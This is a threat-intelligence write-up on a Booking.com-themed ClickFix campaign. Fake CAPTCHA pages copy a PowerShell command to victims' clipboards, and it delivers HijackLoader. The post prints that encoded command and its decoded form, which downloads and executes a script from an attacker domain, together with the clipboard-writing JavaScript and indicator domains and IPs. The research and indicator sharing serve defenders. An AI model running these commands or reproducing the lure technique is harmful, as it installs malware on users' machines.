### Introduction

ClickFix is a well-known social-engineering technique that leads users to compromise themselves by pasting and executing a malicious command in the terminal of their operating system. In recent weeks, our Security Operations Team has directly observed this campaign being actively used, further confirming its relevance and real-world impact. As highlighted in several analyses by [Joe Security](https://x.com/joe4security/status/1979084146010886358) and other researchers, this threat continues to evolve in its themes, delivery methods, and level of sophistication, remaining a highly effective attack vector even today.

Starting from an initial finding shared by [@BlinkzSec](https://x.com/BlinkzSec/status/1994669905866887306), our Threat Intelligence team expanded the investigation based on the data surfaced by our SecOps Team and identified several new domains linked to the ClickFix operation, which appears to be still ongoing. The analysis also revealed pages delivering OS-specific payloads targeting both Windows and macOS users. Based on multiple indicators, we believe with a high degree of confidence that these components were vibe-coded by a Russian-speaking operator.

## Starting point

In this campaign the user is presented with the ClickFix lure: a blurred page displaying a fake verification in the background with a banner that mimics legitimate CAPTCHA challenge.

[![Pasted image 20251204124821](/static/0a278734e96e2bc955202cb70ec1abcb/71c1d/Pasted%20image%2020251204124821.png)](/static/0a278734e96e2bc955202cb70ec1abcb/ec09f/Pasted%20image%2020251204124821.png)

By pressing the button the user is presented with some instructions to follow in order to "verify" its request.

[![Pasted image 20251204124930](/static/e86d9071ce63aad5609c4f095971b779/71c1d/Pasted%20image%2020251204124930.png)](/static/e86d9071ce63aad5609c4f095971b779/ec09f/Pasted%20image%2020251204124930.png)

These instruction automatically copy in the victim's clipboard the payload for another stage
```powershell
powershell -wind mi -Enc JAByAD0AJwBkAG8AdwAgAHkAbwB1AHIAZgBpACcAOwAuACcAaQBlAHgAJwAoACYAKAAkAHIAWwA5AF0AKwAkAHIAWwAyAF0AKwAkAHIAWwA3AF0AKQAgAGgAdAB0AHAAcwA6AC8ALwBrAGoAYQByAHoALgBjAG8AbQAvAGoALgB0AHgAdAApAC4AQwBvAG4AdABlAG4AdAA=
```
Decoding the Base64 coded text we obtain a web request to another page on the same domain, containing a text file
```powershell
$r='dow yourfi';.'iex'(&($r[9]+$r[2]+$r[7]) https://kjarz.com/j.txt).Content
```
The file j.txt contains an obfuscated PowerShell script whose purpose is to download the file named `BMUAUFKZ.msi` on the same domain. This file has been identified as \*\*HijackLoader\*\* malware family.
From VirusTotal relation page, this sample is contacting IP `212.11.64.95`, possibly it's C2 server located in SC and with many other communicating files with high detection rate. This can be a sign of an wider and extended operation carried out by the Threat Actor: https://www.virustotal.com/gui/ip-address/212.11.64.95/relations

Furthermore, the root page of the domain has an open directory, enabling us to access everything from the page, including the ClickFix source code named `uri.html`.

[![Pasted image 20251204125541](/static/dec20ee16bfd7cea603e50b66247b883/7762d/Pasted%20image%2020251204125541.png)](/static/dec20ee16bfd7cea603e50b66247b883/7762d/Pasted%20image%2020251204125541.png)

The directory seems to host also another variant of HijackLoader, named `MRXTOHRL.msi`.

### Web page

The HTML source page itself is fairly common in this kind of attack: it contains a JavaScript code whose main purpose is to dynamically decode and build the malicious web page. The loaded page loads the images and hosts the payload shown above, manipulating user clipboard.

```
function copyToClipboard() {
navigator.clipboard.writeText
                ("powershell -wind mi -Enc JAByAD0AJwBkAG8AdwAgAHkAbwB1AHIAZgBpACcAOwAuACcAaQBlAHgAJwAoACYAKAAkAHIAWwA5AF0AKwAkAHIAWwAyAF0AKwAkAHIAWwA3AF0AKQAgAGgAdAB0AHAAcwA6AC8ALwBrAGoAYQByAHoALgBjAG8AbQAvAGoALgB0AHgAdAApAC4AQwBvAG4AdABlAG4AdAA=");
    }
```

### Pivoting

The malicious page is hosted on IP address `88.214.50.121`, a Russian IP address part of AS 216341, OPTIMA LLC.
Pivoting on the IP address that is hosting the domain, we discovered a wider ClickFix Booking.com themed campaign.

```
hxxps[:]//account-captcha-id4234[.cfd/uri.html
hxxps[:]//account-bookscaptcha[.com/uri.html
hxxps[:]//account-bookextranet[.icu/uri.html
hxxps[:]//account-bookcaptcha[.com/uri.html
hxxps[:]//account-bookcaptcha[.cfd/uri.html
hxxps[:]//account-extranetcaptchapulse[.com/uri.html
https[:]//account-extranetpulser[.com/uri.html
hxxps[:]//account-extrapulse[.cfd/uri.html
```

### Another variant: OS specific payload

One domain in particular caught our attention:
`hxxps[:]//account-extracaptcha[.com/uri.html`
Despite being visually nearly identical to other pages in the campaign, it has a different source code, aiming to a winder audience.
In fact, the JavaScript code of this page looks for the operating system of the user, displaying a different page if the user is accessing through MacOS or Windows:

```
	// Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð´Ð»Ñ Ð¾Ð¿ÑÐµÐ´ÐµÐ»ÐµÐ½Ð¸Ñ Ð¾Ð¿ÐµÑÐ°ÑÐ¸Ð¾Ð½Ð½Ð¾Ð¹ ÑÐ¸ÑÑÐµÐ¼Ñ|
	function getOS() {
		const userAgent = navigator.userAgent.toLowerCase();
		if (userAgent.includes('win')) return 'windows';
		if (userAgent.includes('mac')) return 'mac';
		return 'other';
	}

	// [...]

    // ÐÐ»ÑÑÐµÑÐ½Ð°ÑÐ¸Ð²Ð½ÑÐ¹ Ð¿Ð¾Ð´ÑÐ¾Ð´ - Ð¿ÐµÑÐµÑÐ²Ð°Ñ ÑÐ¾Ð±ÑÑÐ¸Ñ Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ ÑÐ¾ÑÐ¼Ñ
    function interceptFormSubmission() {
        document.addEventListener('submit', function(e) {
            // ÐÑÐ¾Ð²ÐµÑÑÐµÐ¼, ÑÐ²ÑÐ·Ð°Ð½Ð¾ Ð»Ð¸ ÑÐ¾Ð±ÑÑÐ¸Ðµ Ñ CAPTCHA
            if (e.target.closest('awswaf-captcha')) {
                e.preventDefault();
                e.stopPropagation();

                const os = getOS();

                if (os === 'windows') {
                    window.location.href = 'uri.html';
                } else if (os === 'mac') {
                    createMacInstructionModal();
                } else {
                    window.location.href = '/';
                }
            }
        });
    }
```

Notice the code comment in Russian language, meaning "Alternative approach â intercepting the form submission event." Near this comment we can find other russian comments saying things like "Additional click handler", "Run both approaches for reliability.", "Add the Booking.com header as in the example" and "Function to create a modal window with instructions for Mac (as in the example)". This is a clear indicator of usage of LLM in writing the webpage and of a debug and improvement cycle during the development.
